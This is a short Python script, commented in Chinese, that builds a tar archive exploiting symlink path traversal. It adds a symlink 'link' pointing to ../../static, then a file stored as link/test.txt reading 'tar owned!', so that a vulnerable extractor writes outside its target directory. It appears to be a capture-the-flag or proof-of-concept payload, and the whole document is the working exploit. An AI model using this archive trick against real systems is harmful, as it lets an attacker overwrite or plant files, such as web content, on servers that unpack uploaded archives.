from tarfile import TarFile
import subprocess

# 先建立測試檔案
with open("test.txt", "w") as f:
    f.write("tar owned!\n")

# 建立 symlink 指向 ../../static
subprocess.run(["ln", "-sfn", "../../static", "link"])

# 打包
with TarFile("payload.tar", "w") as tarf:
    tarf.add("link")                       # symlink
    tarf.add("test.txt", "link/test.txt")  # 真正的 test.txt，存到 link/test.txt
